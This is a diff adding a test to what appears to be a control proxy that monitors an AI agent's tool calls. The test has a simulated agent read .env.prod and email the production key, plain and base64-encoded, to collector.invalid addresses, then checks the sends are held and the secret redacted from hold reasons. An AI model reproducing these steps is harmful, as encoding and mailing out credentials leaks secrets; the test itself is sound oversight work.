@@ -1,6 +1,7 @@
 """The proxy over real HTTP: a uvicorn server in a thread, fastmcp's client as the agent."""
 
 import asyncio
+import base64
 import json
 from collections.abc import Mapping
 from datetime import UTC, datetime, timedelta
@@ -163,6 +164,28 @@ async def test_secret_values_never_leave_through_the_api(served):
     assert all(PROD_KEY not in text for text in [json.dumps(hold), *pages])
     read, sql = await steps(served, run)
     assert read["secrets"][0]["name"] == "DB_PROD_KEY" and "[secret:" in sql["args"]
+
+
+async def test_a_secret_in_a_recipient_never_shows_in_the_hold_reason(served):
+    """Audit finding 17: the egress rule names the recipient in the reason, and the reasons
+    were kept as the floor made them while the arguments were redacted."""
+    encoded = base64.b64encode(PROD_KEY.encode()).decode()
+    run = await new_run(served, {"may_send_to": ["@example.test"]}, kind="control")
+    async with agent(served, run["key"]) as a:
+        await a.call_tool("read_file", {"path": ".env.prod"})
+        for to in (f"{PROD_KEY}@collector.invalid", f"{encoded}@collector.invalid"):
+            await a.call_tool("send_email", {"to": to, "subject": "s", "body": "b"})
+    pages = {
+        path: (await api(served, "GET", path)).text
+        for path in (f"/api/runs/{run['id']}", "/api/incidents")
+    }
+    leaks = [
+        path for path, text in pages.items() if PROD_KEY in text or encoded in text
+    ]
+    assert leaks == []
+    _, *mails = await steps(served, run)
+    assert [s["status"] for s in mails] == ["would_hold", "would_hold"]
+    assert all("[secret:" in s["reason"] for s in mails)
 
 
 async def test_a_hold_shows_its_deadline_and_the_decision_its_time(served):
